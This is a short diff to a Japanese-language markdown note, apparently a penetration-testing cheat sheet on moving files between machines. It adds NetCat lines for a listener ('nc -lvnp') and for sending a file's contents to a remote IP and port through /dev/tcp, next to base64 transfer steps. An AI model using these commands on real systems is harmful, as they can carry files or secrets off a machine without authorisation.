@@ -12,3 +12,6 @@ tags:
 	- `base64 <ファイル> -w 0`でBase64にエンコードする。
 	- `echo <Base64> | base64 -d > <出力ファイル>`でリモートに展開。
 	- `file <ファイル>`や`md5sum <ファイル>`でファイルが壊れていないか確認できる。
+- [[NetCat]]を使う。
+	- `nc -lvnp <port>`で待ち受ける。
+	- `cat <file> > /dev/tcp/<ip>/<port>`でデータを送信。
